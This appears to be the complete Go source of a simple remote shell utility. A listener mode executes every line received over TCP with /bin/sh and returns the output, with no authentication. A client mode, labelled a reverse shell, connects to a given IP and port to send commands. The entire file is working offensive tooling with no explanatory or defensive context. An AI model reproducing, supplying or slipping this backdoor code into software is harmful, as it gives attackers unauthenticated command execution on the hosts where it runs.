package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

const buf = 4096

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}

}

func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadBytes('\n')

	if err != nil {
		log.Printf("[*] Client left")
		conn.Close()
		return
	}
	command := string(buffer)

	cmd := exec.Command("/bin/sh", "-c", command)
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(err.Error())
	}

	conn.Write(out)

	handleConnection(conn)
}

func Listen(host, port string) {
	log.Println("[*] Starting Listener")

	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", host, port))
	handleError(err)
	defer listener.Close()
	log.Printf("[*] Listening on %v/%v\n", listener.Addr().String(), listener.Addr().Network())

	for {
		client, err := listener.Accept()
		handleError(err)
		log.Printf("[*] Accepted connection from %s\n", client.RemoteAddr())

		go handleConnection(client)
	}
}

func Connect(host, port string) {
	fmt.Println("[*] Starting reverse shell")

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
	handleError(err)
	defer conn.Close()
	fmt.Println("[*] TCP connection established")

	reader := bufio.NewReader(os.Stdin)
	buffer := make([]byte, buf)
	for {
		fmt.Print(">")

		input, _ := reader.ReadString('\n')

		conn.Write([]byte(input))

		message, _ := bufio.NewReader(conn).Read(buffer)
		msg := buffer[:message]
		log.Print(string(msg))
	}
}

func main() {
	var listener, command bool
	var target, port string

	flag.BoolVar(&listener, "l", false, "listener mode")
	flag.BoolVar(&command, "c", false, "command mode")
	flag.StringVar(&port, "p", "", "host port")
	flag.StringVar(&target, "t", "", "host target ip")
	flag.Usage = func() {
		fmt.Printf("Usage:\n")
		fmt.Printf("./main.go -l -c -p 5555 -t 192.168.56.100")
	}
	flag.Parse()

	if listener {
		Listen(target, port)
	} else {
		Connect(target, port)
	}
}
